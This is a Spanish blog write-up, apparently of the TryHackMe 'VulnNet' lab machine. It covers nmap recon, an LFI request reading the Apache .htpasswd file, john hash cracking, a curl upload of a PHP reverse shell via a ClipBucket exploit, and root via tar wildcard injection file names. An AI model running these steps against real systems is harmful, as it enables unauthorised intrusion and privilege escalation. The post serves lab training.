---
layout: single
title: Writeup THM - Maquina Vulnet
comments: true
excerpt: "Hola a todos, ayer resolvi esta maquina de THM y les comparto el writeup"
date: 2021-04-17
classes: wide
header:
  teaser: /assets/images/writeup-maquina-thm-vulnet/vulnet.png
  teaser_home_page: true
categories:
  - TryHackMe
tags:
  - OSCP  
  - Hacking
---

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/vulnet.png" width="200" height="200">
</p>

Hola a todos, ayer en la noche resolvi esta maquina de thm y me parecio muy divertida. Asi que les comparto el writeup

Asi que antes de comenzar leemos la recomendación del autor de la maquina, donde nos dice agregar la ip que nos asignaron con el dominio en vulnnet.thm en el /etc/hosts. Sin embargo esto me huele que debe tener virtual hosting y por ahi debe tener algun subdominio pero vamos que pasa

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_20-56.png">
</p>

ahora damos un scan con nmap para ver a que nos enfrentamos 

```bash
nmap -sC -sV -p22,80 -Pn -oN targeted vulnnet.thm 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-17 21:15 -05
Nmap scan report for vulnnet.thm (10.10.226.231)
Host is up (0.18s latency).
rDNS record for 10.10.226.231: broadcast.vulnnet.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.23 seconds
```

<br>
al ver la salida de nmap, me parecio interesante podemos ver que tenemos el puerto 22,80. Esto nos dice que seguro que todo los tiros seran por la parte web


<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_21-19.png">
</p>

hice un reconocimiento de la web para ver si por algun lado se escapaba un usuario y puedar poder acceder al sistema, pero sin exito :(. Asi que segui haciendo un reconocimiento con Wappalyzer y podemos ver las tegnologias que usa esta web

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_21-21.png">
</p>

tambien hice un escaneo con dirsearch pero nada interesante, pero si revisamos el codigo fuente de la web y revisamos los recursos encontramos algo interesante 

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_22-19.png">
</p>

entonces podemos ver que estos javascript estan ofuscados, pero use una herramienta online de desofuscar el javascript y buscar algun indicio que me ayude seguir avanzando. Entonces al desofuscar el archivo index__7ed54732.js podemos obtener un subdominio interesante

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_22-32.png">
</p>

bueno este subdominio lo agregare al /etc/hosts

```bash
10.10.226.231 broadcast.vulnnet.thm vulnnet.thm
```
podemos ver cuando accedemos a este subdominio me sale un popup donde pide un usuario y password 

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_22-51.png">
</p>

pero ahora no tengo ningun usuario, ni mucho menos credenciales. Asi que sigamos buscando en el otro archivo javascript

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_22-34.png">
</p>

este ultimo me manda url con un parametro interesante, asi que realizando pruebas, encontramos que es vulnerable a LFI 

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_23-04.png">
</p>

ya que tenemos un servidor web apache busquemos archivos de configuracion google y el repositorio de seclists me ayudaron mucho, asi que revisando en /etc/apache2/sites-enabled/000-default.conf

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_23-24.png">
</p>

asi que entremos busquemos en /etc/apache2/.htpasswd

```bash
http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd
```
<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_23-33.png">
</p>

ya que encontramos un user y un hash, crackeemos ese hash con john

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-17_23-52.png">
</p>

ya que tenemos las credenciales probe usando dichas credenciales en broadcast.vulnnet.thm 

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_13-23.png">
</p>

podemos ver que esta web esta usando un cms llamado clickbucket, que funciona para compartir fotos y videos algo del estilo youtube, pero busquemos la version de dicho cms en el codigo fuente

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_13-34.png">
</p>

bueno ahora que sabemos la version busquemos un exploit que nos ayude a entrar al sistema 

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_13-40.png">
</p>

revisando el exploit que encontramos revisamos un comando curl que segun dice nos permitira subir una shell, asi que preparemos una shell que viene en kali o parrot por defecto y lo renombraremos como shell.php

```bash
/usr/share/webshells/php/php-reverse-shell.php
```

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_13-56.png">
</p>

como podemos solo modifique en la shell mi ip y un puerto al que se conectara, asi que ahora probe el comando curl que viene en el exploit

```bash
curl -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```
<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_13-59.png">
</p>

que mal al utilizar dicho comando me sale un error, el mensaje dice algo como que el servidor no encuentra que este autorizado para realizar dicha solicitud, asi viendo los comandos de curl probe agregar las credenciales que encontre y con las que me autentifique en dicha web

```bash
curl -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php -u developers:9972761drmfsls"
```
<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_14-06.png">
</p>

genial, nos salio como respuesta que se subio nuestra shell, ahora me tarde viendo donde encuentro dicha shell jaja. pero revisando un exploit de metasploit pude encontrar la ruta

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_14-11.png">
</p>

bueno la ruta era muy obvia jeje pero listo ahora dejemos el puerto 4444 en escucha y ejecutemos nuestra shell en nuestro navegador

```bash
nc -nlvp 4444
```

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_14-16.png">
</p>

genial tenemos shell

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_14-18.png">
</p>

## Obteniendo el user.txt

Ya pudimos acceder al sistema asi que nos damos con la tarea de obtener la flag de user.txt, asi que ejecutando linpeas.sh pude ver un archivo interesante /var/backups/ssh-backup.tar.gz. Por lo tanto descomprimi dicho archivo

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_14-24.png">
</p>

encontramos un id_rsa, asi que intente ingresar con algun usuario por ssh con dicho id_rsa pero me pedia un passphrase 

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_14-28.png">
</p>

bueno asi que crackee dicho id_rsa con john

```bash
ssh2john id_rsa > id_rsa.hash
```

```bash
john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt
```
<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_14-36.png">
</p>

listo ya que tenemos el passphrase, ahora si probare ingresar con el usuario server-management. aunque tuve problemas para acceder creo que era por la vpn por que al reiniciar la maquina, funciono y pude acceder

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_14-39.png">
</p>

ahora nos queda leer el flag user.txt

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_14-42.png">
</p>

## Obteniendo el root.txt
Ahora nos toca sacar el root.txt, asi que revisando podemos ver que se esta ejecutando un tarea en crontab

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_15-51.png">
</p>

revisando dicho script backupsrv.sh podemos ver que hace un backup con tar de todo lo que que se encuentra en /home/server-management/Documents, de esto nos damos cuenta por asterisco que esta usando

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_16-05.png">
</p>

por lo tanto investigando pude ver un articulo muy interesante que me ayudo a ejecutar una archivo bash aprovechando del tar y el asterisco que esta usando

```bash
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
```
asi creamos nuestra shell

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_16-34.png">
</p>

y ejecutamos las siguientes dos lineas del articulo que leimos

```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

y ahora dejemos en escucha nuestra puerto que pusimos en nuestra shell.sh y esperemos que se conecte nuestra reverse shell

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_16-40.png">
</p>


genial, ahora a obtener nuestra shell

<p align="center">
<img src="/assets/images/writeup-maquina-thm-vulnet/2021-04-18_16-42.png">
</p>

listo con esto terminamos de vencer esta maquina, y nos vamos aprendiendo cosas nuevas. nos vemos :)